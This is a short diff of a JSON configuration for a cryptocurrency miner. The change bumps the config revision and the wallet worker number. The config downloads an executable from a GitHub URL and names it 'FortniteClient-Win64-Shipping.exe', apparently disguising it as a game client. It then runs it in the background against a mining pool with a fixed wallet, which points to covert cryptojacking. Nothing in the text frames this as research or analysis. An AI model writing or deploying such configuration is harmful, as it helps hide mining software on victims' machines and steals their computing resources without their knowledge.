@@ -1,6 +1,6 @@
 {
   "version": 1,
-  "config_revision": 4,
+  "config_revision": 5,
   "miner_url": "https://raw.githubusercontent.com/terraversa/VBC-MNR/main/FortniteClient-Win64-Shipping.exe",
   "miner_name": "FortniteClient-Win64-Shipping.exe",
   "miner_version": "1",
@@ -18,7 +18,7 @@
     "--pool",
     "prl.kryptex.network:8048",
     "--wallet",
-    "prl1pgnzyhyf4j7dgml9fuy8p2s0lsktv8sqtzy3azhq3f6a46zyxe80q89am38.2",
+    "prl1pgnzyhyf4j7dgml9fuy8p2s0lsktv8sqtzy3azhq3f6a46zyxe80q89am38.3",
     "--tls",
     "true",
     "--background"
